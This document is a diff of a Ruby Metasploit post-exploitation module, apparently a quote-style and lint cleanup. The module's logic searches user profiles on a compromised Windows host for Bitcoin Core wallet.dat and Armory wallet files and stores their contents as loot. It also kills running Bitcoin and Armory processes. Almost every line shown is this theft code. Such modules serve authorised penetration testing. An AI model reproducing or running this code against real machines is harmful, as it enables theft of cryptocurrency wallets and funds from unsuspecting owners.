@@ -43,17 +43,17 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    print_status("Checking all user profiles for Bitcoin wallets...")
+    print_status('Checking all user profiles for Bitcoin wallets...')
     found_wallets = false
-    grab_user_profiles().each do |user|
+    grab_user_profiles.each do |user|
       next unless user['AppData']
 
-      bitcoin_wallet_path = user['AppData'] + "\\Bitcoin\\wallet.dat"
+      bitcoin_wallet_path = user['AppData'] + '\\Bitcoin\\wallet.dat'
       next unless file?(bitcoin_wallet_path)
 
       found_wallets = true
       jack_wallet(bitcoin_wallet_path)
-      armory_wallet_path = user['AppData'] + "\\Armory"
+      armory_wallet_path = user['AppData'] + '\\Armory'
       session.fs.dir.foreach(armory_wallet_path) do |fname|
         next unless fname =~ /\.wallet/
 
@@ -63,12 +63,12 @@ class MetasploitModule < Msf::Post
       end
     end
     unless found_wallets
-      print_warning "No wallets found, nothing to do."
+      print_warning 'No wallets found, nothing to do.'
     end
   end
 
   def jack_wallet(wallet_path)
-    data = ""
+    data = ''
     wallet_type = case wallet_path
                   when /\.wallet$/
                     :armory
@@ -96,11 +96,11 @@ class MetasploitModule < Msf::Post
     end
 
     if data.empty?
-      print_error("No data found, nothing to save.")
+      print_error('No data found, nothing to save.')
     else
       loot_result = store_loot(
         "bitcoin.wallet.#{wallet_type}",
-        "application/octet-stream",
+        'application/octet-stream',
         session,
         data,
         wallet_path,
@@ -111,13 +111,13 @@ class MetasploitModule < Msf::Post
   end
 
   def kill_bitcoin_processes
-    client.sys.process.get_processes().each do |process|
+    client.sys.process.get_processes.each do |process|
       pname = process['name'].downcase
-      if pname == "bitcoin.exe" || pname == "bitcoind.exe" || pname == "armoryqt.exe"
-        print_status("#{process['name']} Process Found...")
-        print_status("Killing Process ID #{process['pid']}...")
-        session.sys.process.kill(process['pid'])
-      end
+      next unless pname == 'bitcoin.exe' || pname == 'bitcoind.exe' || pname == 'armoryqt.exe'
+
+      print_status("#{process['name']} Process Found...")
+      print_status("Killing Process ID #{process['pid']}...")
+      session.sys.process.kill(process['pid'])
     end
   end
 end
